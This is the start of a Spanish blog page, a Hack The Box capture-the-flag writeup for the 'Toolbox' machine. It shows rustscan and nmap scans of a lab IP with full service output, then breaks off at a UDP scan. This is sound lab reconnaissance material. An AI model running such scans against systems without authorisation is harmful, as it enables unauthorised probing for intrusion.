@@ -1,0 +1,667 @@
+<!doctype html>
+<html lang="es">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta http-equiv="X-Clacks-Overhead" content="GNU Terry Pratchett" />
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="shortcut icon" href="/pointed.png" />
+
+<title>Hack The Box: Toolbox Writeup | Easy&nbsp;|&nbsp;Bajo el Teclado</title>
+<meta
+  name="title"
+  content="Hack The Box: Toolbox Writeup | Easy"
+/>
+<meta
+  name="description"
+  content="Hack The Box: Toolbox Writeup
+Welcome to my detailed writeup of the easy difficulty machine &ldquo;Toolbox&rdquo; on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration
+
+
+
+
+
+
+1rustscan -a 10.129.96.171 --ulimit 5000 -g
+210.129.96.171 -&gt; [21,22,135,139,443,445,5985,49668,49667,49669,49664,49666,49665]
+
+
+
+
+
+
+ 1nmap -p21,22,135,139,443,445,5985,49668,49667,49669,49664,49666,49665 -sCV 10.129.96.171 -oN allPorts
+ 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:10 CEST
+ 3Nmap scan report for 10.129.96.171
+ 4Host is up (0.037s latency).
+ 5
+ 6PORT      STATE SERVICE       VERSION
+ 721/tcp    open  ftp           FileZilla ftpd
+ 8| ftp-syst: 
+ 9|_  SYST: UNIX emulated by FileZilla
+10| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+11|_-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
+1222/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+13| ssh-hostkey: 
+14|   2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
+15|   256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
+16|_  256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
+17135/tcp   open  msrpc         Microsoft Windows RPC
+18139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+19443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
+20|_ssl-date: TLS randomness does not represent time
+21| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
+22| Not valid before: 2020-02-18T17:45:56
+23|_Not valid after:  2021-02-17T17:45:56
+24|_http-server-header: Apache/2.4.38 (Debian)
+25|_http-title: MegaLogistics
+26| tls-alpn: 
+27|_  http/1.1
+28445/tcp   open  microsoft-ds?
+295985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+30|_http-server-header: Microsoft-HTTPAPI/2.0
+31|_http-title: Not Found
+3249664/tcp open  msrpc         Microsoft Windows RPC
+3349665/tcp open  msrpc         Microsoft Windows RPC
+3449666/tcp open  msrpc         Microsoft Windows RPC
+3549667/tcp open  msrpc         Microsoft Windows RPC
+3649668/tcp open  msrpc         Microsoft Windows RPC
+3749669/tcp open  msrpc         Microsoft Windows RPC
+38Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+39
+40Host script results:
+41|_clock-skew: -1h59m59s
+42| smb2-security-mode: 
+43|   3:1:1: 
+44|_    Message signing enabled but not required
+45| smb2-time: 
+46|   date: 2024-08-24T18:11:36
+47|_  start_date: N/A
+48
+49Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+50Nmap done: 1 IP address (1 host up) scanned in 64.21 seconds
+UDP Enumeration
+
+
+
+
+
+
+1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.96.171 -oN allPorts.UDP
+2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:03 CEST
+3Nmap scan report for 10.129.96.171
+4Host is up (0.035s latency).
+5Not shown: 1499 open|filtered udp ports (no-response)
+6PORT      STATE  SERVICE
+726994/udp closed unknown
+8
+9Nmap done: 1 IP address (1 host up) scanned in 1.04 seconds
+FTP Enumeration
+Encontramos un instalador de docker.
+"
+/>
+<meta
+  name="keywords"
+  content="HackTheBox,Toolbox,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,RCE,Exploit,Linux,Windows,Container Pivoting,Docker Breakout,Docker,SQLi,SQL Injection,Authentication Bypass,HTTP Enumeration,"
+/>
+
+  <meta name="author" content="Andrés Del Cerro" />
+
+
+
+
+<meta property="og:url" content="http://localhost:1313/writeups/toolbox---hackthebox/">
+  <meta property="og:site_name" content="Bajo el Teclado">
+  <meta property="og:title" content="Hack The Box: Toolbox Writeup | Easy">
+  <meta property="og:description" content="Hack The Box: Toolbox Writeup Welcome to my detailed writeup of the easy difficulty machine “Toolbox” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration 1rustscan -a 10.129.96.171 --ulimit 5000 -g 210.129.96.171 -&gt; [21,22,135,139,443,445,5985,49668,49667,49669,49664,49666,49665]1nmap -p21,22,135,139,443,445,5985,49668,49667,49669,49664,49666,49665 -sCV 10.129.96.171 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:10 CEST 3Nmap scan report for 10.129.96.171 4Host is up (0.037s latency). 5 6PORT STATE SERVICE VERSION 721/tcp open ftp FileZilla ftpd 8| ftp-syst: 9|_ SYST: UNIX emulated by FileZilla 10| ftp-anon: Anonymous FTP login allowed (FTP code 230) 11|_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe 1222/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) 13| ssh-hostkey: 14| 2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA) 15| 256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA) 16|_ 256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519) 17135/tcp open msrpc Microsoft Windows RPC 18139/tcp open netbios-ssn Microsoft Windows netbios-ssn 19443/tcp open ssl/http Apache httpd 2.4.38 ((Debian)) 20|_ssl-date: TLS randomness does not represent time 21| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR 22| Not valid before: 2020-02-18T17:45:56 23|_Not valid after: 2021-02-17T17:45:56 24|_http-server-header: Apache/2.4.38 (Debian) 25|_http-title: MegaLogistics 26| tls-alpn: 27|_ http/1.1 28445/tcp open microsoft-ds? 295985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 30|_http-server-header: Microsoft-HTTPAPI/2.0 31|_http-title: Not Found 3249664/tcp open msrpc Microsoft Windows RPC 3349665/tcp open msrpc Microsoft Windows RPC 3449666/tcp open msrpc Microsoft Windows RPC 3549667/tcp open msrpc Microsoft Windows RPC 3649668/tcp open msrpc Microsoft Windows RPC 3749669/tcp open msrpc Microsoft Windows RPC 38Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 39 40Host script results: 41|_clock-skew: -1h59m59s 42| smb2-security-mode: 43| 3:1:1: 44|_ Message signing enabled but not required 45| smb2-time: 46| date: 2024-08-24T18:11:36 47|_ start_date: N/A 48 49Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 50Nmap done: 1 IP address (1 host up) scanned in 64.21 secondsUDP Enumeration 1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.96.171 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:03 CEST 3Nmap scan report for 10.129.96.171 4Host is up (0.035s latency). 5Not shown: 1499 open|filtered udp ports (no-response) 6PORT STATE SERVICE 726994/udp closed unknown 8 9Nmap done: 1 IP address (1 host up) scanned in 1.04 secondsFTP Enumeration Encontramos un instalador de docker. ">
+  <meta property="og:locale" content="es">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-08-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-08-24T00:00:00+00:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Toolbox">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Cybersecurity">
+    <meta property="article:tag" content="Penetration Testing">
+    <meta property="article:tag" content="CTF">
+
+
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hack The Box: Toolbox Writeup | Easy">
+  <meta name="twitter:description" content="Hack The Box: Toolbox Writeup Welcome to my detailed writeup of the easy difficulty machine “Toolbox” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration 1rustscan -a 10.129.96.171 --ulimit 5000 -g 210.129.96.171 -&gt; [21,22,135,139,443,445,5985,49668,49667,49669,49664,49666,49665]1nmap -p21,22,135,139,443,445,5985,49668,49667,49669,49664,49666,49665 -sCV 10.129.96.171 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:10 CEST 3Nmap scan report for 10.129.96.171 4Host is up (0.037s latency). 5 6PORT STATE SERVICE VERSION 721/tcp open ftp FileZilla ftpd 8| ftp-syst: 9|_ SYST: UNIX emulated by FileZilla 10| ftp-anon: Anonymous FTP login allowed (FTP code 230) 11|_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe 1222/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) 13| ssh-hostkey: 14| 2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA) 15| 256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA) 16|_ 256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519) 17135/tcp open msrpc Microsoft Windows RPC 18139/tcp open netbios-ssn Microsoft Windows netbios-ssn 19443/tcp open ssl/http Apache httpd 2.4.38 ((Debian)) 20|_ssl-date: TLS randomness does not represent time 21| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR 22| Not valid before: 2020-02-18T17:45:56 23|_Not valid after: 2021-02-17T17:45:56 24|_http-server-header: Apache/2.4.38 (Debian) 25|_http-title: MegaLogistics 26| tls-alpn: 27|_ http/1.1 28445/tcp open microsoft-ds? 295985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 30|_http-server-header: Microsoft-HTTPAPI/2.0 31|_http-title: Not Found 3249664/tcp open msrpc Microsoft Windows RPC 3349665/tcp open msrpc Microsoft Windows RPC 3449666/tcp open msrpc Microsoft Windows RPC 3549667/tcp open msrpc Microsoft Windows RPC 3649668/tcp open msrpc Microsoft Windows RPC 3749669/tcp open msrpc Microsoft Windows RPC 38Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 39 40Host script results: 41|_clock-skew: -1h59m59s 42| smb2-security-mode: 43| 3:1:1: 44|_ Message signing enabled but not required 45| smb2-time: 46| date: 2024-08-24T18:11:36 47|_ start_date: N/A 48 49Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 50Nmap done: 1 IP address (1 host up) scanned in 64.21 secondsUDP Enumeration 1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.96.171 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:03 CEST 3Nmap scan report for 10.129.96.171 4Host is up (0.035s latency). 5Not shown: 1499 open|filtered udp ports (no-response) 6PORT STATE SERVICE 726994/udp closed unknown 8 9Nmap done: 1 IP address (1 host up) scanned in 1.04 secondsFTP Enumeration Encontramos un instalador de docker. ">
+
+
+
+
+
+  <meta itemprop="name" content="Hack The Box: Toolbox Writeup | Easy">
+  <meta itemprop="description" content="Hack The Box: Toolbox Writeup Welcome to my detailed writeup of the easy difficulty machine “Toolbox” on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.
+TCP Enumeration 1rustscan -a 10.129.96.171 --ulimit 5000 -g 210.129.96.171 -&gt; [21,22,135,139,443,445,5985,49668,49667,49669,49664,49666,49665]1nmap -p21,22,135,139,443,445,5985,49668,49667,49669,49664,49666,49665 -sCV 10.129.96.171 -oN allPorts 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:10 CEST 3Nmap scan report for 10.129.96.171 4Host is up (0.037s latency). 5 6PORT STATE SERVICE VERSION 721/tcp open ftp FileZilla ftpd 8| ftp-syst: 9|_ SYST: UNIX emulated by FileZilla 10| ftp-anon: Anonymous FTP login allowed (FTP code 230) 11|_-r-xr-xr-x 1 ftp ftp 242520560 Feb 18 2020 docker-toolbox.exe 1222/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) 13| ssh-hostkey: 14| 2048 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA) 15| 256 a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA) 16|_ 256 ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519) 17135/tcp open msrpc Microsoft Windows RPC 18139/tcp open netbios-ssn Microsoft Windows netbios-ssn 19443/tcp open ssl/http Apache httpd 2.4.38 ((Debian)) 20|_ssl-date: TLS randomness does not represent time 21| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR 22| Not valid before: 2020-02-18T17:45:56 23|_Not valid after: 2021-02-17T17:45:56 24|_http-server-header: Apache/2.4.38 (Debian) 25|_http-title: MegaLogistics 26| tls-alpn: 27|_ http/1.1 28445/tcp open microsoft-ds? 295985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 30|_http-server-header: Microsoft-HTTPAPI/2.0 31|_http-title: Not Found 3249664/tcp open msrpc Microsoft Windows RPC 3349665/tcp open msrpc Microsoft Windows RPC 3449666/tcp open msrpc Microsoft Windows RPC 3549667/tcp open msrpc Microsoft Windows RPC 3649668/tcp open msrpc Microsoft Windows RPC 3749669/tcp open msrpc Microsoft Windows RPC 38Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows 39 40Host script results: 41|_clock-skew: -1h59m59s 42| smb2-security-mode: 43| 3:1:1: 44|_ Message signing enabled but not required 45| smb2-time: 46| date: 2024-08-24T18:11:36 47|_ start_date: N/A 48 49Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 50Nmap done: 1 IP address (1 host up) scanned in 64.21 secondsUDP Enumeration 1sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn 10.129.96.171 -oN allPorts.UDP 2Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:03 CEST 3Nmap scan report for 10.129.96.171 4Host is up (0.035s latency). 5Not shown: 1499 open|filtered udp ports (no-response) 6PORT STATE SERVICE 726994/udp closed unknown 8 9Nmap done: 1 IP address (1 host up) scanned in 1.04 secondsFTP Enumeration Encontramos un instalador de docker. ">
+  <meta itemprop="datePublished" content="2024-08-24T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2024-08-24T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1523">
+  <meta itemprop="keywords" content="HackTheBox,Toolbox,Writeup,Cybersecurity,Penetration Testing,CTF,Reverse Shell,Privilege Escalation,RCE,Exploit,Linux,Windows,Container Pivoting,Docker Breakout,Docker,SQLi,SQL Injection,Authentication Bypass,HTTP Enumeration">
+<meta name="referrer" content="no-referrer-when-downgrade" />
+
+    
+    <link href="/simple.min.css" rel="stylesheet" />
+
+    
+    <link href="/style.min.css" rel="stylesheet" />
+
+    
+
+    
+</head>
+
+  <body>
+    <header>
+      <nav>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-ZHDKLM7DD2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-ZHDKLM7DD2');
+</script>
+
+
+  <a
+    href="/"
+    
+    >Home</a
+  >
+
+  <a
+    href="/about/"
+    
+    >About me</a
+  >
+
+  <a
+    href="/writeups/"
+    
+    >Writeup&#39;s</a
+  >
+
+
+</nav>
+<div style="display: flex; justify-content: center; align-items: center">
+  <div style="display: flex; width: 20rem; gap: 2rem;">
+    <img src="yo.png" alt="">
+    <h1>Hack The Box: Toolbox Writeup | Easy</h1>
+  </div>
+</div>
+
+
+    </header>
+    <main>
+      
+  
+  
+  <content>
+    <h1 id="hack-the-box-toolbox-writeup">Hack The Box: Toolbox Writeup</h1>
+<p>Welcome to my detailed writeup of the easy difficulty machine <strong>&ldquo;Toolbox&rdquo;</strong> on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.</p>
+<h1 id="tcp-enumeration">TCP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>rustscan -a 10.129.96.171 --ulimit <span style="color:#ff0;font-weight:bold">5000</span> -g
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>10.129.96.171 -&gt; [21,22,135,139,443,445,5985,49668,49667,49669,49664,49666,49665]</span></span></code></pre></div>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>nmap -p21,22,135,139,443,445,5985,49668,49667,49669,49664,49666,49665 -sCV 10.129.96.171 -oN allPorts
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-24 22:10 CEST
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span>Nmap scan report <span style="color:#fff;font-weight:bold">for</span> 10.129.96.171
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span>Host is up (0.037s latency).
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span>21/tcp    open  ftp           FileZilla ftpd
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span>|_  SYST: UNIX emulated by FileZilla
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>|_-r-xr-xr-x <span style="color:#ff0;font-weight:bold">1</span> ftp ftp      <span style="color:#ff0;font-weight:bold">242520560</span> Feb <span style="color:#ff0;font-weight:bold">18</span>  <span style="color:#ff0;font-weight:bold">2020</span> docker-toolbox.exe
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12</span><span>22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13</span><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14</span><span>|   <span style="color:#ff0;font-weight:bold">2048</span> 5b:1a:a1:81:99:ea:f7:96:02:19:2e:6e:97:04:5a:3f (RSA)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15</span><span>|   <span style="color:#ff0;font-weight:bold">256</span> a2:4b:5a:c7:0f:f3:99:a1:3a:ca:7d:54:28:76:b2:dd (ECDSA)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16</span><span>|_  <span style="color:#ff0;font-weight:bold">256</span> ea:08:96:60:23:e2:f4:4f:8d:05:b3:18:41:35:23:39 (ED25519)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17</span><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18</span><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19</span><span>443/tcp   open  ssl/http      Apache httpd 2.4.38 ((Debian))
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20</span><span>|_ssl-date: TLS randomness does not represent <span style="color:#fff;font-weight:bold">time</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21</span><span>| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22</span><span>| Not valid before: 2020-02-18T17:45:56
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23</span><span>|_Not valid after:  2021-02-17T17:45:56
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24</span><span>|_http-server-header: Apache/2.4.38 (Debian)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25</span><span>|_http-title: MegaLogistics
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26</span><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27</span><span>|_  http/1.1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28</span><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29</span><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30</span><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31</span><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32</span><span>49664/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33</span><span>49665/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34</span><span>49666/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35</span><span>49667/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36</span><span>49668/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37</span><span>49669/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38</span><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40</span><span>Host script results:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41</span><span>|_clock-skew: -1h59m59s
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42</span><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43</span><span>|   3:1:1: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44</span><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45</span><span>| smb2-time: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46</span><span>|   date: 2024-08-24T18:11:36
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47</span><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48</span><span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49</span><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50</span><span>Nmap <span style="color:#fff;font-weight:bold">done</span>: <span style="color:#ff0;font-weight:bold">1</span> IP address (<span style="color:#ff0;font-weight:bold">1</span> host up) scanned in 64.21 seconds</span></span></code></pre></div>
+<h1 id="udp-enumeration">UDP Enumeration</h1>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>sudo nmap --top-ports <span style="color:#ff0;font-weight:bold">1500</span> -sU --min-rate <span style="color:#ff0;font-weight:bold">5000</span> -n -Pn 10.129.96.171 -oN allPorts.UDP
